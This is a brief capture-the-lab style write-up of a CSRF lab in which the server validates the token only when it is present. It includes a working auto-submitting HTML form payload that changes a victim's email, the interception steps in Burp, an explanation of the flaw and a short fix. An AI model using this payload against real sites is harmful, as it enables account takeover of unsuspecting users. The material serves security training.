# Lab 3: CSRF Token Validation Depends on Token Being Present
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Server only validates token IF it exists in the request.
Removing it entirely bypasses validation.

## Payload
```<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
````
Steps

Intercepted email change request in Burp
Changed token value → rejected
Deleted csrf parameter entirely → accepted!
Crafted form without csrf parameter
Delivered to victim → solved

Why It Works
Server logic: if token exists, validate it.
No token = no validation = bypass.
Lazy implementation by the developer.
Fix
Always require CSRF token presence AND validate it.
